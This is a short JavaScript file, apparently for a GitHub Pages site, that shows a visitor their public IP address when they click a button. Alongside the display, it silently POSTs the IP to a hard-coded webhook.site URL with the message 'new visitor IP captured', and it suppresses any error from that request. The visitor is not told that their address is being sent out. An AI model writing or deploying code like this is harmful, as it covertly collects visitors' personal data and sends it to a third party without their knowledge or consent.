let fetchState = "idle";

const revealBtn = document.getElementById("revealBtn");
const ipDisplay = document.getElementById("ipDisplay");
const errorDisplay = document.getElementById("errorDisplay");

// Coloque aqui a sua URL do Webhook.site
const WEBHOOK_URL = "https://webhook.site/a28368da-f371-48d1-8528-a7a00966ac34";

revealBtn.addEventListener("click", async () => {
  if (fetchState === "loading" || fetchState === "success") return;

  fetchState = "loading";
  ipDisplay.textContent = "Carregando...";
  errorDisplay.textContent = "";

  try {
    // 🔹 API que permite CORS direto no GitHub Pages
    const res = await fetch("https://api64.ipify.org?format=json");
    if (!res.ok) throw new Error("Falha na requisição");

    const data = await res.json();
    ipDisplay.textContent = `Seu IP: ${data.ip}`;
    fetchState = "success";

    // 🔹 Enviar IP para Webhook.site
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `Novo visitante IP capturado: ${data.ip}`,
      }),
    }).catch(() => {});

  } catch (err) {
    console.error(err);
    errorDisplay.textContent = "Erro de rede. Tente novamente.";
    ipDisplay.textContent = "";
    fetchState = "error";
  }
});
